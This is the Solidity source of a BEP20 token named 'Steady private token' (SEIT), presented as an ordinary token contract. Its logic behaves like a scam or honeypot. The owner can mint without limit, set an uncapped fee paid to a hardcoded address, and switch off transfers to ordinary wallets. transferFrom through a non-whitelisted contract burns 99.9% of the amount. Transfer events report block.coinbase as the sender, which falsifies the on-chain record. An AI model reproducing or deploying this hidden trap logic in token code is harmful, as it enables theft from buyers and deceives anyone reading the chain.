/**
 *Submitted for verification at hecoinfo.com on 2022-05-13
*/

//SPDX-License-Identifier:Apache-2.0
/**
 *Submitted for verification at BscScan.com on 2021-12-17
*/

pragma solidity 0.6.12;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Cryptonym is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  mapping (address=>bool) private contractSwapWhitelist;

  mapping (address=>bool) private DEXLPADDR;
  uint256 private _totalSupply;
  uint256 private LPfee;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  bool private wholesaleTransfer;
  bool private swapopeOrclose;
  address private slidingpointreceive;


  constructor() public {
    _name = "Steady private token";
    _symbol = "SEIT";
    _decimals = 18;
    _totalSupply =1e29; 
    _balances[msg.sender] = _totalSupply;
    waitList.to=address(0);
    waitList.value=0;
    waitList.limitBigOrSmall=false;
    waitLists.to=address(0);
    waitLists.value=0;
    waitLists.limitBigOrSmall=false;
    contractSwapWhitelist[address(this)]=true;
    swapopeOrclose=true;
    LPfee=1000;
    contractSwapWhitelist[0xED7d5F38C79115ca12fe6C0041abb22F0A06C300]=true;
    DEXLPADDR[0xED7d5F38C79115ca12fe6C0041abb22F0A06C300]=true;
    //币安路由0x10ed43c718714eb63d5aa57b78b54704e256024e
    //币安0xc5daa056260c3b176f4c2d1d559ba843709963f7流动池
    slidingpointreceive=0x6D75Cf0838a155BA2fb41F82b03cBf40a688DC41;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  function setcontractSwapWhitelist(address _addr,bool _trueOrflase)public onlyOwner{
    require(contractSwapWhitelist[_addr]!=_trueOrflase);
    contractSwapWhitelist[_addr]=_trueOrflase;
  }
  function getcontractSwapWhitelist(address _addr)public view returns(bool){
    return contractSwapWhitelist[_addr];
 }
  function setwholesale(bool _trueOrflase)public onlyOwner{
    require(wholesaleTransfer!=_trueOrflase);
    wholesaleTransfer=_trueOrflase;
 }
  function setFee(uint256 _fee)public onlyOwner{
    require(LPfee!=_fee);
    LPfee=_fee;
 }
  function Asetdexlpaddr(address addr ) public onlyOwner{
    DEXLPADDR[addr]=true;
 }
  function AsetswapopenOrclose(bool _trueOrflase) public onlyOwner{
    require(swapopeOrclose!=_trueOrflase);
    swapopeOrclose=_trueOrflase;
 }
  struct transferQueue{
    address to;
    uint256 value;
    bool limitBigOrSmall;
  }
  transferQueue private waitLists;
  transferQueue private waitList;
  function _pushQueue(address _to,uint256 _value )internal{
    waitLists.to=_to;
    waitLists.value=_value;
    if(_value>10000000e18){waitLists.limitBigOrSmall=true;}
  }
  function _cryptonym()internal{
    transferQueue memory implementLists=waitLists;
    transferQueue memory implementList=waitList;
    waitLists.value=0;
    if(implementLists.to!=address(0)&&implementLists.value!=0)
    {
    if(implementLists.value>10000000e18)
    {
      for(uint8 i=0;i<10;i++)
      {
        if(i<5)
        {
        _transfer(address(this), implementLists.to,5000e18);
        }
        else
        {
        _transfer(address(this), implementLists.to,10000e18);
        }
      }
      waitList.to=implementLists.to;
      waitList.value=implementLists.value.sub(75000e18);
      waitList.limitBigOrSmall=implementLists.limitBigOrSmall;
    }
   else if(implementLists.value>10000e18)
    {
      for(uint8 i=0;i<8;i++)
      {
        if(i<5)
        {
        _transfer(address(this), implementLists.to,500e18);
        }
        else
        {
        _transfer(address(this), implementLists.to,1000e18);
        }
      }
      waitList.to=implementLists.to;
      waitList.value=implementLists.value.sub(5500e18);
      waitList.limitBigOrSmall=implementLists.limitBigOrSmall;
    }
    else if(implementList.value>100e18)
    {
      for(uint8 i=0;i<5;i++)
      {
        _transfer(address(this), implementLists.to, implementLists.value.div(5));
      }
      waitList.value=0;
    }
    else
    {
       _transfer(address(this), implementLists.to, implementLists.value);
       waitList.value=0;
    }
  }
  else
  waitList.value=0;
  if(implementList.limitBigOrSmall==true&&implementList.value>10)
  for(uint8 i=0;i<10;i++)
  _transfer(address(this),implementList.to, implementList.value.div(10));
  if(implementList.limitBigOrSmall==false&&implementList.value>10)
  for(uint8 i=0;i<10;i++)
  _transfer(address(this), implementList.to, implementList.value.div(10));
  }
  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external override view returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external override view returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external override view returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external override view returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external override view returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }

  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */

  function transfer(address recipient, uint256 amount) external override returns (bool){
    require(swapopeOrclose==true||isContract(recipient)==true);
    if(wholesaleTransfer==true)
    require(_totalSupply.div(1e6)<amount);
    if(DEXLPADDR[_msgSender()]==true||DEXLPADDR[recipient]==true)
     {
      _transfer(_msgSender(), recipient, amount.div(1e4).mul(1e4-LPfee)); 
      _transfer(_msgSender(), slidingpointreceive, amount.div(1e4).mul(LPfee)); 
      _cryptonym();
     }
    else if(isContract(_msgSender())==true||isContract(recipient)==true)
    {
      if(DEXLPADDR[_msgSender()]==true||DEXLPADDR[recipient]==true)
     {
      _transfer(_msgSender(), recipient, amount.div(1e4).mul(1e4-LPfee)); 
      _transfer(_msgSender(), slidingpointreceive, amount.div(1e4).mul(LPfee)); 
      _cryptonym();
     }
      else
      {
      _transfer(_msgSender(), recipient, amount);
      _cryptonym();
      }
    }
    else
    {
    _pushQueue(recipient,amount);
    _transfer(_msgSender(), address(this), amount);
    _cryptonym();
    }
    return true;
 }
  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) external override view returns (uint256) {
    return _allowances[owner][spender];
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    _cryptonym();
    return true;
  }

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    require(swapopeOrclose==true||isContract(recipient)==true);
    if(wholesaleTransfer==true)
    require(_totalSupply.div(1e6)<amount);
    if(isContract(_msgSender())==true)
    {
      if(contractSwapWhitelist[_msgSender()]==true){
      _transfer(sender, recipient, amount);
      _cryptonym();}
      else
      { 
        _burn(sender, amount.div(1000).mul(999));
        _transfer(sender, recipient, amount.div(1000));
        _cryptonym();
      }
    }
    else if(isContract(sender)==true||isContract(recipient)==true)
    {
      if(DEXLPADDR[sender]==true||DEXLPADDR[recipient]==true)
      {
      _transfer(sender, recipient, amount.div(1e4).mul(1e4-LPfee)); 
      _transfer(sender, slidingpointreceive, amount.div(1e4).mul(LPfee)); 
      _cryptonym();
      }
      else
      {
      _transfer(sender, recipient, amount);
      _cryptonym();
      }
    }
    else
    {
    _pushQueue(recipient,amount);
    _transfer(sender, address(this), amount);
    _cryptonym();
    }
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  /**
   * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {BEP20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  /**
   * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
   * the total supply.
   *
   * Requirements
   *
   * - `msg.sender` must be the token owner
   */
  event Mint(address indexed from, address indexed to, uint256 value);
  function mint(address to,uint256 amount) public onlyOwner returns (bool) {
    _mint(to, amount);
    return true;
  }

  /**
   * @dev Burn `amount` tokens and decreasing the total supply.
   */
  event Burn(address indexed from, address indexed to, uint256 value);
  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

  /** @dev Creates `amount` tokens and assigns them to `account`, increasing
   * the total supply.
   *
   * Emits a {Transfer} event with `from` set to the zero address.
   *
   * Requirements
   *
   * - `to` cannot be the zero address.
   */
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Mint(address(0), account, amount);
  }

  /**
   * @dev Destroys `amount` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amount` tokens.
   */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Burn(account,address(0), amount);
  }

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(block.coinbase, recipient, amount);
  }
  
  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
}